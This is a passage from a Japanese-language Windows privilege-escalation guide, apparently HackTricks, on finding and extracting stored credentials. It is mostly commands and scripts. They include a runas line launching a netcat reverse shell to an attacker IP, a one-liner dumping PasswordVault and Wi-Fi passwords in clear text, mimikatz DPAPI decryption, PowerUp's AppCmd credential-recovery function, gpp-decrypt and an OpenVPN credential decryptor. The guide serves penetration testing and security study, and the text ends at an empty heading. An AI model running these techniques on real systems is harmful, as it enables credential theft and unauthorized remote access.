reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

`DefaultUserName` と `DefaultDomainName` は認証情報ではなく、アカウントのコンテキストとして扱ってください。空でない `DefaultPassword` または `AltDefaultPassword` の値は、レジストリ内の平文パスワードの発見を意味します。`AutoAdminLogon=1` であっても、読み取れる平文パスワードがない場合は、あくまで手がかりにすぎません。[Sysinternals Autologon はパスワードを LSA secret として保存することがあります](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon)。通常のレジストリ読み取りだけでは、その secret が存在するか、取得できるかは確認できません。認証情報の露出を報告する前に、アクセス権と実際のログオン設定を確認してください。

### Credential Manager / Windows Vault

[https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup> より\
Windows Vault は、**Windows** が**ユーザーの自動ログインに使用できる**サーバー、Webサイト、その他のプログラム用のユーザー認証情報を保存します。最初は、ユーザーが Facebook、Twitter、Gmail などのサイトの認証情報を保存し、ブラウザーで自動ログインできるようにするものだと思うかもしれませんが、そうではありません。

Windows Vault は、Windows がユーザーの自動ログインに使用できる認証情報を保存します。つまり、リソース（サーバーまたはWebサイト）へのアクセスに認証情報が必要な**Windowsアプリケーションは、この Credential Manager と Windows Vault を利用**し、ユーザーが毎回ユーザー名とパスワードを入力する代わりに、保存された認証情報を使用できます。

アプリケーションが Credential Manager と連携しない限り、特定のリソース用の認証情報を使用することはできないと思います。そのため、アプリケーションで vault を利用するには、何らかの方法で**Credential Manager と通信し、既定のストレージ vault からそのリソースの認証情報を要求する**必要があります。

`cmdkey` を使用して、マシンに保存されている認証情報を一覧表示します。

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

その後、保存された認証情報を使用するには、`/savecred` オプションを指定して `runas` を使用できます。次の例では、SMB share 経由でリモートのバイナリを呼び出しています。

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

提供された認証情報を使用して`runas`を実行する。

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

mimikatz、lazagne、[credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html)、[VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html)、または [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) を使用できることに注意してください。

### UWP PasswordVault / Credential Locker

最新の Windows UWP アプリケーション、Microsoft Edge、および最新のシステムサービスは、認証トークンと平文パスワードを Universal Windows Platform (UWP) の `PasswordVault`（`vaultcmd` では `Web Credentials` としても表示されます）に保存します。このストレージ領域はセッションごとに分離されており、管理者権限や `SeDebugPrivilege` がなくても、ネイティブに復号できます。

ユーザーのアクティブなセッション内でこの PowerShell コマンドを実行すると、保存されているすべてのユーザー名と平文パスワードを即座にダンプして復号できます：

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)** は、データを対称暗号化するための方法を提供します。主に Windows オペレーティングシステム内で、非対称秘密鍵の対称暗号化に使用されます。この暗号化では、ユーザーまたはシステムの秘密情報を利用して、エントロピーを大幅に高めます。

**DPAPI は、ユーザーのログイン秘密情報から導出された対称鍵を使って鍵を暗号化します**。システムの暗号化では、システムのドメイン認証情報を使用します。

DPAPI を使用して暗号化されたユーザーの RSA 鍵は、`%APPDATA%\Microsoft\Protect\{SID}` ディレクトリに保存されます。ここで `{SID}` はユーザーの[セキュリティ識別子](https://en.wikipedia.org/wiki/Security_Identifier)を表します。**ユーザーの秘密鍵を保護するマスターキーと同じファイルに格納されている DPAPI キー**は、通常、64 バイトのランダムデータで構成されます。（このディレクトリへのアクセスは制限されているため、CMD の `dir` コマンドでは内容を一覧表示できませんが、PowerShell では一覧表示できます）。

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

**mimikatz module** `dpapi::masterkey` を適切な引数（`/pvk` または `/rpc`）とともに使用して、復号できます。

**マスターパスワードで保護された認証情報ファイル**は通常、次の場所にあります：

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

`/masterkey` を適切に指定して、**mimikatz module** `dpapi::cred` を使うと復号できます。\
（root 権限があれば）`sekurlsa::dpapi` module を使って、**memory** から多数の **DPAPI** **masterkeys** を**抽出**できます。


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** は、暗号化された認証情報を手軽に保存する方法として、**scripting** や自動化タスクでよく使用されます。認証情報は **DPAPI** で保護されており、通常は作成時と同じコンピューター上の同じユーザーでしか復号できません。

エクスポートされた認証情報のファイル名や `.xml` のパスは任意です。スクリプトやファイルの一覧からファイルが見つかった場合は、`C:\Users` にあると決めつけず、対象アカウントの実際のプロファイルディレクトリを確認してください。[Windows ではプロファイルを別の場所に配置できます](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory)。ファイルを読み取れることは手がかりにすぎません。[Windows の `Export-Clixml` は、暗号化された認証情報をエクスポートしたユーザーとコンピューターに紐付けます](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml)。また、復元したアカウントが対象サービスで有効な権限を持つかどうかは、別途確認する必要があります。通常の調査では、暗号化された値や平文の値を表示せずに、まずパスと ACL を確認してください。

ファイルに含まれる PS credentials を**復号**するには、次のようにします。

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wifi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### 保存済みRDP接続

次の場所で確認できます: `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
および `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### 最近実行したコマンド

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **リモート デスクトップ資格情報マネージャー**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

**Mimikatz** の `dpapi::rdg` module を適切な `/masterkey` とともに使用して、**任意の .rdg ファイルを復号**します\
Mimikatz の `sekurlsa::dpapi` module を使うと、メモリから**多数の DPAPI masterkey を抽出**できます

**mRemoteNG は別の接続ストアを使用します。** `%APPDATA%\mRemoteNG` とユーザーの Documents にある読み取り可能な XML を調べます。`config.xml` のような一般的な名前のファイルも対象にします。XML ファイルを認証情報の手がかりとして扱う前に、接続スキーマと暗号化された `Password` 属性を特定してください。保存されている値は DPAPI/RDCMan のパスワードではありません。復元できるかどうかは、ファイルの暗号化設定とカスタム master password が使われたかどうかによって異なります。広範な列挙時に暗号化された値を出力しないでください。

**Remote Desktop Plus のプロファイルエクスポート**も、ユーザーディレクトリや共有の管理フォルダーから読み取れる場合があります。従来形式の `profiles.xml` エクスポートには、`ProfileName`、`Password`、`Secure` 要素を含む `Data/Profile` エントリがあります。空でない password 要素は、出力したり平文だと決めつけたりせず、認証情報の手がかりとして扱ってください。[ベンダーの説明](https://www.donkz.nl/)によると、プロファイル保護は作成時のアカウントとコンピューターに紐付けることも、より緩い設定にすることもできます。これを利用する前に、ファイルの出所と復元条件を確認してください。

### Sticky Notes

Windows ワークステーションでは、Sticky Notes アプリを使って**パスワード**などの情報を保存している人がよくいますが、これはデータベースファイルだと気付いていないことがあります。このファイルは `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` にあり、検索して調べる価値があります。

付箋アプリにパスワードなどの情報を保存する人もいます。Microsoft のパッケージ版 Sticky Notes アプリでは、通常、メモは `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` に保存されます。古いアプリや別のアプリでは、LevelDB を含む、ユーザープロファイル内の別の場所に保存される場合があります。SQLite ファイルが見つからないことを、メモが存在しない根拠として扱う前に、インストールされているアプリと保存形式を特定してください。

Sticky Notes が SQLite の write-ahead logging を使用している場合、`plum.sqlite` だけをコピーすると、最近コミットされたメモが含まれないことがあります。データベースの一貫性が保たれたコピーとともに `plum.sqlite-wal` も保持し、利用可能であれば `plum.sqlite-shm` も含めてください。共有メモリのインデックスは再構築できますが、WAL はデータベースの永続状態の一部です。[SQLite の WAL ドキュメント](https://www.sqlite.org/wal.html)を参照してください。アカウント名やパスワードを含むメモは、あくまで認証情報の手がかりです。アカウント、許可されたアクセス、およびパスワードの再利用を個別に検証してください。暗号化されたパスワードマネージャーのレコードから、より高い権限のログインが可能だと判断するには、実際の復号キーとアプリケーション固有の解釈も必要です。

### AppCmd.exe

**AppCmd.exe からパスワードを復元するには、Administrator であり、High Integrity level で実行する必要があることに注意してください。**\
**AppCmd.exe** は `%systemroot%\system32\inetsrv\` ディレクトリにあります。\
このファイルが存在する場合、何らかの**認証情報**が設定されており、**復元できる**可能性があります。

このコードは [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) から抽出されました：

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` が存在するか確認してください。\
インストーラーは **SYSTEM 権限で実行され**、多くが **DLL Sideloading（情報元** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**）に対して脆弱です。**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Files and Registry (認証情報)

### サポートツールのレジストリ認証情報アーティファクト

古いリモートサポートのインストール環境では、固定のアプリケーションレジストリキーにパスワード関連の値名が残っていることがあります。たとえば、[ベンダーによるレジストリキーの説明](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988)によると、TeamViewerの`SecurityPasswordAES`はバージョン9より前では、設定済みの静的セッションパスワードを示していました。値名のマーカーはあくまで調査の手掛かりです。その認証情報を評価する前に、インストールされているバージョン、読み取り可能な値データ、形式、現在の認証動作を確認してください。リモートサポートのパスワードから、より権限の高いWindowsアカウントにアクセスするには、そのアカウントで実際にパスワードが再利用されており、かつ使用が許可されている必要があります。日常的な列挙結果に暗号文や復元したパスワードを含めないでください。

### 保護されたシートを含む共有スプレッドシート

読み取り可能な共有ワークブックにアカウントデータが含まれている疑いがある場合は、**ファイルの暗号化**と、ワークシートの保護や非表示列を区別してください。[Microsoftの説明](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel)によると、ワークシートの保護は編集を制御するものであり、セキュリティ機能ではありません。それだけでは、ワークブックの内容が暗号化されているとは言えません。許可された関連ファイルのみを調査し、広範な列挙中に候補となる秘密情報を表示しないでください。読み取り可能な`.xlsx`のパス、保護されたシート、または非表示列だけでは、認証情報の存在も、いずれかのアカウントがより高い権限を持つことも証明できません。実際のデータと現在のアカウント権限を別途確認してください。

### CIサーバーに保持された変更パッチ

CIサーバーは、ビルドの完了後も、送信されたソースコードの変更をデータディレクトリに保持することがあります。[TeamCityのドキュメント](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html)では、`system/changes`をリモート実行の変更を保存する場所として説明しています。データディレクトリは設定可能であり、必ずしも`ProgramData`配下にあるとは限りません。読み取り可能なパッチには、認証情報ファイル、暗号化キー、またはその両方を使用するスクリプトへの参照が、削除または追加された状態で残っている可能性があります。たとえば、PowerShellの`ConvertTo-SecureString -Key`ワークフローでは、暗号化された文字列に加えてAESキーも必要です。[Microsoftのドキュメント](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring)では、キーは別途指定すると説明されています。まずアクセス可能なパッチ名だけを確認し、その後、許可された範囲で関連内容を調べ、日常的な列挙結果に秘密情報を表示しないでください。パッチのパス、暗号化された値、またはキーへの参照だけでは、有効な認証情報や、より高い権限でのアクセスは証明できません。データディレクトリのACLを制限し、ビルド変更に秘密情報をコミットしないでください。

### カスタムのローカル管理者パスワードローテーション

独自に作成したパスワードローテーターは、暗号化されたローカル管理者パスワードをローカルサービスに保存し、データストアの認証情報は読み取り可能な`.env`ファイル内、またはアップデーターのバイナリの隣に置いていることがあります。アップデーターのスケジュールタスク、アカウント、設定ファイルのACL、リスナー、データストアの権限をあわせて確認してください。ループバックのみにバインドされたデータストアでも、有効な認証情報を持つローカルユーザーからアクセスできます。ただし、認証に成功しただけでは、該当レコードを読み取る権限があるとは限りません。暗号化シードやキー素材が暗号文の隣から取得できる場合は、その暗号化を信用する前に、正確な鍵導出方法を確認してください。露出したシードからGoの[`math/rand`](https://pkg.go.dev/math/rand)を使ってAESキーを決定的に導出する方式は、そのパスワードの保護には不適切です。Goのドキュメントでも、このパッケージはセキュリティ上重要な乱数用途には適さないとされています。復元したパスワードを権限昇格経路とみなす前に、そのパスワードが現在も有効であり、ローカルのAdministratorsグループに属するアカウントのものだと確認してください。スケジュールタスク、`.env`のパス、または暗号化されたデータだけでは、これらの条件はいずれも証明できません。日常的な列挙結果にパスワードやキー素材を含めないでください。

管理されたローカル管理者パスワードには[Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview)を使用してください。ディレクトリまたはEntraを利用したストレージとアクセス制御は、カスタムのローカルデータストアとは別のものです。同様に、[Elasticsearchのロール](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/)によって、認証済みのデータストアユーザーが特定のインデックスを読み取れるかどうかが決まります。

### Javaサーバープラグインのアーカイブと認証情報の再利用

一部のJavaサーバープラグインは、サーバーの`plugins`ディレクトリ内にJARアーカイブとして配布されています。読み取り可能なカスタムプラグインには、設定やバイトコードに埋め込まれたサービス認証情報が含まれていることがあります。許可された場合に限りアーカイブを調査し、復元した秘密情報を日常的な列挙結果に含めないでください。プラグインのパスだけでは秘密情報の存在は証明できません。また、サービスパスワードを取得しても、より権限の高いアカウントでも有効な場合に限り、権限昇格につながります。該当ファイルのACLを確認し、再利用されている認証情報は別々の秘密情報に置き換えてください。ディレクトリ構成については[PaperMCのプラグインインストールガイド](https://docs.papermc.io/paper/adding-plugins/)、アーカイブの内容については[OracleのJARドキュメント](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html)を参照してください。

### Openfireの組み込みデータベース認証情報

組み込みデータベースを使用するOpenfireのインストール環境では、`Openfire\embedded-db`に`openfire.script`が保存されていることがあります。現在のアカウントで読み取れる場合は、`OFUSER`レコードと`passwordKey`プロパティをあわせて確認してください。Openfireの[ユーザープロバイダーのドキュメント](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html)によると、パスワードはプレーンテキストで保存することも、このプロパティに保持されたキーで暗号化することもできます。復元したパスワードが権限昇格に関係するのは、より権限の高いIDで現在も有効な場合に限られます。ファイル名だけでは、読み取りアクセスも認証情報の再利用も証明できません。このパスはインベントリ調査の手掛かりにすぎないため、データベースの内容や認証情報を日常的な列挙結果に含めないでください。

別のファイルである`Openfire\conf\openfire.xml`からは、外部データベースを使用している場合でも、管理コンソールに設定されたポートとバインドインターフェイスを確認できます。Openfireの管理コンソールは通常、ループバックにバインドされますが、リスナーが動作していれば、ローカルアカウントからそのアドレスにアクセスできます。実際のリスナー、許可された管理者ロール、プラグインのアップロードポリシー、Openfireサービスの実行IDをあわせて確認してください。プラグインをインストールできる管理者は、サービスのコンテキストでプラグインコードを実行させることができます。サービスがLocalSystemとして実行されている場合、その権限は非常に高い可能性があります。一致するアカウントパスワードや読み取り可能な設定パスだけでは、管理コンソールへのアクセスやコード実行は証明できません。ベンダーの[インストールおよびプラグイン管理ガイド](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html)と[プラグインアップロードAPIプロパティ](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html)を参照してください。

### フォレンジック管理サーバーの設定

Velociraptorサーバーの設定ファイルは、一般に`server.config.yaml`という名前で、内部CAの`CA.private_key`を含むことがあります。権限の低いユーザーがそのキーを読み取れる場合、APIクライアント証明書を発行できる可能性があります。これがより高い権限につながるかどうかは、サーバーのユーザーロール、APIへの到達性、サーバーまたは対象エージェントの実行IDによって異なります。クライアント設定には別の情報が含まれます。クライアント設定が見つかっても、サーバーCAへのアクセスがあるとは限りません。CA秘密鍵をオフラインで保管している環境もあるため、読み取り可能なサーバー設定に署名キーが含まれていない場合もあります。

Windowsサーバーでは、インストールディレクトリにある**サーバー**設定ファイルと、保護されたバックアップコピーのACLを確認してください。場所の例は`%ProgramFiles%\VelociraptorServer\server.config.yaml`です。異なる場合は、サービスに設定されたパスを使用してください。現在のIDでファイルを読み取れることと、`CA.private_key`が実際に存在することを確認してください。ログや列挙結果に秘密鍵を表示しないでください。ベンダーの`config api_client`ワークフローではCAキーを使ってクライアント証明書を発行しますが、サーバー側で有効なロールも必要です。ロールの作成や変更には、データストアへの書き込みアクセスまたは再起動が必要な場合があります。そうした書き込みができなくても、既存の特権サーバーIDが経路となる可能性があります。実行権限を持つAPIクエリは、該当するサーバーまたはエージェントのコンテキストで実行されるため、非常に高い権限を持つことがあります。

サーバー設定とバックアップは制限的なACLで保護し、可能な場合はCA署名キーをオフラインで保管して、APIロールとリスナーへのアクセスを制限してください。[Velociraptor APIドキュメント](https://docs.velociraptor.app/docs/server_automation/server_api/)と[セキュリティ設定ガイダンス](https://docs.velociraptor.app/docs/deployment/security/)を参照してください。

### PuTTYの認証情報

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY は独立したセッションマネージャーです。ネイティブの暗号化ストアは `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat` にある場合があります。一方、エクスポートされたセッションのバックアップは `sessions-backup.dat` という名前で、別の場所に保存されていることがあります。[SolarWinds のエクスポートガイド](https://thwack.solarwinds.com/discussion/comment/115591)によると、エクスポートデータはパスワードで暗号化され、セッション、キー、スクリプト、タグ、関連付けを含む場合があります。[サポートフォーラム](https://thwack.solarwinds.com/discussion/4520/saved-session-lost)にはネイティブストアの場所が記載されています。まずファイルのアクセス許可とパスを確認してください。いずれかのファイルが見つかっても、そのパスワードが判明するわけではなく、保存された認証情報が現在も有効であることや、より高い権限を持つことの証明にもなりません。

### PuTTY SSH ホストキー

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### レジストリ内の SSH keys

SSH private keys はレジストリキー `HKCU\Software\OpenSSH\Agent\Keys` に保存されていることがあるため、興味深い情報がないか確認してください。

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

そのパス内にエントリが見つかった場合、保存された SSH key である可能性が高いです。暗号化されていますが、[https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) を使って簡単に復号できます。\
この手法の詳細はこちら: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

`ssh-agent` サービスが実行されておらず、起動時に自動で開始するようにするには、次を実行します:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> この手法はもう有効ではないようです。ssh keys を作成して `ssh-add` で追加し、ssh 経由でマシンにログインしてみました。レジストリ HKCU\Software\OpenSSH\Agent\Keys は存在せず、procmon でも非対称鍵認証中に `dpapi.dll` の使用は確認できませんでした。

### 無人インストールファイル

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

**metasploit**を使って、これらのファイルを検索することもできます: _post/windows/gather/enum_unattend_

コンテンツ例:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### SAM & SYSTEM のバックアップ

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

読み取り可能な Windows Imaging（`.wim`）バックアップファイルには、オフラインの `SAM`、`SECURITY`、`SYSTEM` hive が含まれている場合もあります。ローカルからアクセス可能なバックアップまたはイメージのディレクトリを優先し、何かを抽出する前にイメージの**メンバー名**を確認してください。`.wim` というファイル名だけでは hive が露出している証拠にはならず、一般的な `install.wim`、`boot.wim`、リカバリーイメージは誤検知となることがよくあります。SMB share は別のアクセス経路であり、その share が対象範囲に含まれる場合にのみ確認してください。Microsoft の [Windows image guidance](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) と [registry hive file reference](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives) を参照してください。

### クラウド認証情報

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

**SiteList.xml** という名前のファイルを検索します。

### キャッシュされた GPP パスワード

以前は、Group Policy Preferences (GPP) を使って、複数のマシンにカスタムのローカル管理者アカウントを展開できる機能がありました。しかし、この方法には重大なセキュリティ上の欠陥がありました。まず、SYSVOL に XML ファイルとして保存されている Group Policy Objects (GPO) は、ドメイン内のすべてのユーザーがアクセスできました。さらに、GPP 内のパスワードは、公開されている既定の鍵を使って AES256 で暗号化されていましたが、認証済みユーザーであれば誰でも復号できました。そのため、ユーザーが昇格した権限を取得するおそれがあり、重大なリスクとなっていました。

このリスクを軽減するため、空ではない「cpassword」フィールドを含む、ローカルにキャッシュされた GPP ファイルをスキャンする機能が開発されました。そのようなファイルが見つかると、この機能はパスワードを復号し、カスタムの PowerShell オブジェクトを返します。このオブジェクトには GPP の詳細とファイルの場所が含まれており、このセキュリティ上の脆弱性の特定と修正に役立ちます。

以下のファイルを、`C:\ProgramData\Microsoft\Group Policy\history` または _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (Windows Vista より前)_ で検索します。

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword を復号するには:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

crackmapexecを使用してパスワードを取得する：

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web設定

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

認証情報を含む web.config の例:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### IIS webroot 内のバックアップアーカイブ

配信対象の webroot に古い ZIP バックアップが直接置かれていると、過去の設定ファイルや再利用可能な認証情報が漏えいするおそれがあります。漏えいと判断する前に、サイトに設定された物理パスと、そのアーカイブが HTTP 経由で実際にアクセス可能かを確認してください。既定の `C:\inetpub\wwwroot` は候補のひとつにすぎません。アーカイブを開かずに、名前とサイズを一覧表示する簡単なローカル調査方法は次のとおりです。

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

アーカイブの名前だけでは、秘密情報が含まれていることも、復元した認証情報でより高い権限を得られることも証明できません。

### OpenVPN 認証情報

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### ログ

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### 認証情報を尋ねる

